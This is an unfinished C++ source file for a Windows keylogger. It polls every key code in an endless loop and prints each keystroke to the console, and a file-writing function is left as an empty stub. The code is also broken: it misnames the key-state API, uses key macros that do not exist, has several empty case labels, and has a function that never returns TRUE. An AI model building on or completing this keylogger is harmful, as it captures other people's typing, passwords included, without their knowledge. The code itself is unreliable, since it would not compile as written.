#include "../includes/includes.hpp"

// WM_KEYDOWN
//  WM_KEYUP
//  WM_SYSKEYDOWN
//  WM_SYSKEYUP
//  WM_INPUT messages.

// sets the command line got by the next function to an argv pointer style
LPWSTR * CommandLineToArgvW(LPCWSTR lpCmdLine, int     *pNumArgs);
// Gets the command line of the current process
LPSTR GetCommandLineA();
// translate Message from Virtual-Code to characters
BOOL TranslateMessage(const MSG *lpMsg);
LRESULT DefWindowProcA(HWND   hWnd,  UINT   Msg,  WPARAM wParam, LPARAM lParam);
// will be usefull for Input combined with ALT


void __ft_writeTofile(int key)
{
    ;
}

BOOL __is_printable_key(int key)
{
    // all the ASCII unmapped keys should be specified here using WINDOWS macros 
    switch(key)
    {
        case VK_RBUTTON:
            //std::cout << " [RightClick] " << std::endl;
            std::cout << " [RightClick] ";
            break;
        case VK_LBUTTON:
            std::cout << " [LeftClick] ";
            break;
        case VK_MBUTTON:
            std::cout << " [MiddleMouse] ";
            break;
        case VK_BACK:
            std::cout << " [BackSpaceKey] ";
            break;
        case VK_TAB:
            std::cout << " [TabKey] ";
            break;
        case VK_CLEAR:
            std::cout << " [ClearKey] ";
            break;
        case VK_RETURN:
            std::cout << " [EnterKey] ";
            break;
        case VK_SHIFT:
            std::cout << " [ShiftKey] ";
            break;
        case VK_CONTROL:
            std::cout << " [ControlKey] ";
            break;
        case VK_MENU:
            std::cout << " [AltKey] ";
            break;
        case VK_CAPITAL:
            std::cout << " [CapsLockKey] ";
            break;
        case VK_ESCAPE:
            std::cout << " [EchapKey] ";
            break;
        case VK_SPACE:
            std::cout << " [SpaceBar] ";
            break;
        case VK_PRIOR:
            std::cout << " [PgUpKey] ";
            break;
        case VK_NEXT:
            std::cout << " [PgDownKey] ";
            break;
        case VK_END:
            std::cout << " [EndKey] ";
            break;
        case VK_HOME:
            std::cout << " [HomeKey] ";
            break;
        case VK_LEFT:
            std::cout << " [ArrowLeftKey] ";
            break;
        case VK_RIGHT:
            std::cout << " [ArrowRightKey] ";
            break;
        case VK_UP:
            std::cout << " [ArrowUpKey] ";
            break;
        case VK_DOWN:
            std::cout << " [ArrowDownKey] ";
            break;
        case VK_INSERT:
            std::cout << " [InsertKey] ";
            break;
        case VK_LWIN:
            std::cout << " [] ";
            break;
        case VK_RWIN:
            std::cout << " [] ";
            break;
        case VK_NUMPAD0:
            std::cout << " [NUMPAD0] ";
            break;
        case VK_NUMPAD1:
            std::cout << " [NUMPAD1] ";
            break;
        case VK_NUMPAD2:
            std::cout << " [NUMPAD2] ";
            break;
        case VK_NUMPAD3:
            std::cout << " [NUMPAD3] ";
            break;
        case VK_NUMPAD4:
            std::cout << " [NUMPAD4] ";
            break;
        case VK_NUMPAD5:
            std::cout << " [NUMPAD5] ";
            break;
        case VK_NUMPAD6:
            std::cout << " [NUMPAD6] ";
            break;
        case VK_NUMPAD7:
            std::cout << " [NUMPAD7] ";
            break;
        case VK_NUMPAD8:
            std::cout << " [NUMPAD8] ";
            break;
        case VK_NUMPAD9:
            std::cout << " [NUMPAD9] ";
            break;
        case VK_MULTIPLY:
            std::cout << " [MultiplyKey] ";
            break;
        case VK_ADD:
            std::cout << " [AddKey] ";
            break;
        case VK_SUBSTRACT:
            std::cout << " [SubstractKey] ";
            break;
        case VK_DIVIDE:
            std::cout << " [DivideKey] ";
            break;
        case VK_DECIMALE:
            std::cout << " [DecimalKey] ";
            break;
        case VK_SEPARATOR:
            std::cout << " [SeparatorKey] ";
            break;
        case VK_F1:
            std::cout << " [F1_Key] ";
            break;
        case VK_F2:
            std::cout << " [F2_Key] ";
            break;
        case VK_F3:
            std::cout << " [F3_Key] ";
            break;
        case VK_F4:
            std::cout << " [F4_Key] ";
            break;
        case VK_F5:
            std::cout << " [F5_Key] ";
            break;
        case VK_F6:
            std::cout << " [F6_Key] ";
            break;
        case VK_F7:
            std::cout << " [F7_Key] ";
            break;
        case VK_F8:
            std::cout << " [F8_Key] ";
            break;
        case VK_F9:
            std::cout << " [F9_Key] ";
            break;
        case VK_F10:
            std::cout << " [F10_Key] ";
            break;
        case VK_F11:
            std::cout << " [F11_Key] ";
            break;
        case VK_F12:
            std::cout << " [F12_Key] ";
            break;
        case VK_NUMLOCK:
            std::cout << " [NumLockKey] ";
            break;
        case VK_LSHIFT:
            std::cout << " [] ";
            break;
        case VK_RSHIFT:
            std::cout << " [] ";
            break;
        case VK_LCONTROL:
            std::cout << " [] ";
            break;
        case VK_RCONTROL:
            std::cout << " [] ";
            break;
        case VK_LMENU:
            std::cout << " [] ";
            break;
        case VK_RMENU:
            std::cout << " [] ";
            break;
        case VK_VOLUME_MUTE:
            std::cout << " [] ";
            break;
        case VK_VOLUME_DOWN:
            std::cout << " [] ";
            break;
        case VK_VOLUME_UP:
            std::cout << " [] ";
            break;
        case :
            std::cout << " [] ";
            break;
        case :
            std::cout << " [] ";
            break;
        case :
            std::cout << " [] ";
            break;
        case :
            std::cout << " [] ";
            break;

        default:
            return FALSE;
    }
}
// 7 - 10 - 11 - 14 - 15 - (48 - 90) - 94 - 146 - 150 - 151 - 159 - 184 - 193 - 218 - 224 - 225 - 227 - 228 - 230 - 232 - 233 - 245 = 63 
int __keyStrokeslogger(int ac, char **av)
{
    while (TRUE)
    {    
        for (int key = 0; key < 256; key++)
        {
            if (GetAsyncState(key) & 0b1)
            {
                if (__is_printable_key(key) == TRUE)
                {

                }
                else
                    std::cout << " [" << (char) key << "] ";
            }
        }
    }
    return (0);
}

int main(int ac, char **av)
{
    int status = 0;


    if ((status = __keyStrokeslogger(ac, av)) == -1)
    {
        std::cout << "Error Occured" << std::endl;
        exit(1);
    }
    return (0);
}